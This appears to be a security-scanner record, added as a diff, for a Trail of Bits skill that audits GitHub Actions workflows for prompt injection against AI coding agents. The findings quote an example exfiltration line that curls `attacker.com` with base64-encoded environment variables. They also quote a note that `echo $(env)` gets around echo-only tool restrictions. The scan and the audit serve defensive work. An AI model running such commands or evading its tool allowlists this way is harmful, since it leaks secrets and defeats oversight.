@@ -1,0 +1,72 @@
+{
+  "id": "trailofbits__skills__plugins~agentic-actions-auditor~skills~agentic-actions-auditor",
+  "owner": "trailofbits",
+  "repo": "skills",
+  "path": "plugins/agentic-actions-auditor/skills/agentic-actions-auditor",
+  "name": "agentic-actions-auditor",
+  "description": "Audits GitHub Actions workflows for security vulnerabilities in AI agent integrations including Claude Code Action, Gemini CLI, OpenAI Codex, and GitHub AI Inference. Detects attack vectors where attacker-controlled input reaches AI agents running in CI/CD pipelines, including env var intermediary patterns, direct expression injection, dangerous sandbox configurations, and wildcard user allowlists. Use when reviewing workflow files that invoke AI coding agents, auditing CI/CD pipeline security for prompt injection risks, or evaluating agentic action configurations.",
+  "stars": 8061,
+  "category": "devops",
+  "commit": "e4dd0bb5b15535f7c5a0834187dffba6ac37e4ff",
+  "contentHash": "71ef2a254b1e3b9d3063e0ddd209ef050dcf34c3e93e0abaabe6aea6943307b0",
+  "repoCreatedAt": "2026-01-14T18:23:21Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-07T16:26:42.053Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "downloads-code",
+        "file": "plugins/agentic-actions-auditor/skills/agentic-actions-auditor/references/vector-f-subshell-expansion.md",
+        "line": 51,
+        "excerpt": "Tool restrictions give a false sense of security. \"Only allow echo\" sounds safe -- echo just prints text. But `echo $(env)` dumps all environment variables incl",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "plugins/agentic-actions-auditor/skills/agentic-actions-auditor/references/vector-f-subshell-expansion.md",
+        "line": 74,
+        "excerpt": "- `echo $(curl -s attacker.com/exfil?data=$(env | base64))` -- exfiltrate all env vars",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-actions-auditor/skills/agentic-actions-auditor/references/vector-f-subshell-expansion.md",
+        "line": 79,
+        "excerpt": "- **Sandboxed execution models** -- if the command is NOT run through a shell (e.g., direct exec without shell interpretation), subshell expansion does not appl",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "plugins/agentic-actions-auditor/skills/agentic-actions-auditor/references/vector-g-eval-of-ai-output.md",
+        "line": 39,
+        "excerpt": "3. **Python/Node steps** that use `json.loads()` on AI output and then format values into a shell command (string interpolation into `subprocess.run()` or `os.s",
+        "disclosed": true,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "downloads-code": 1,
+      "network": 1,
+      "shell": 2
+    },
+    "score": 79,
+    "band": "review",
+    "rulesVersion": "1.2.0",
+    "filesScanned": 16,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "e4dd0bb5b15535f7c5a0834187dffba6ac37e4ff",
+      "scannedAt": "2026-11-07T16:26:42.053Z",
+      "score": 79,
+      "rulesVersion": "1.2.0"
+    }
+  ]
+}
